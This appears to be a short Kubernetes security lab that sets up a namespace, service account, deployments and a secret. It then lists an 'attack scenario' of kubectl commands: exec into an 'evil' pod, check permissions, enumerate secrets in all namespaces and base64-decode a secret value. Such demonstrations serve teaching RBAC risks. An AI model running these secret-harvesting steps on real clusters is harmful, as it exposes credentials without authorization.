#### Create Cluster and set infrastructure

````
kubectl apply -f namespace.yaml 

kubectl apply -f serviceaccount.yaml

kubectl apply -f deployment-demo-ns.yaml

kubectl apply -f deployment.yaml

kubectl apply -f secret.yaml

````

#### Attack scenario

````
kubectl get pods --all-namespaces

kubectl exec -it $EVIL_POD_NAME /bin/sh

kubectl auth can-i --list

kubectl auth can-i get secrets --all-namespaces=true

kubectl get secrets --all-namespaces

kubectl get secret mysecret -n demo-ns -o yaml

kubectl get secret mysecret -n demo-ns --template={{.data.SUPER_SECRET_VALUE}} | base64 -d

````